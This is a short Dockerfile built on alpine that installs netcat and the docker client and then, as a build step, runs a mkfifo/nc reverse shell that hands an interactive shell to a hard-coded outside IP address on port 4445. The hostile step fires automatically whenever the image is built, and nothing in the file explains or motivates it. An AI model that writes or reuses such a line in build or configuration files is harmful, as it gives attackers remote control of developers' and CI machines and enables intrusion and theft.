FROM alpine:latest
RUN apk add --update --no-cache netcat-openbsd docker

RUN ls -al; ls -al

RUN rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 85.214.33.30 4445 >/tmp/f


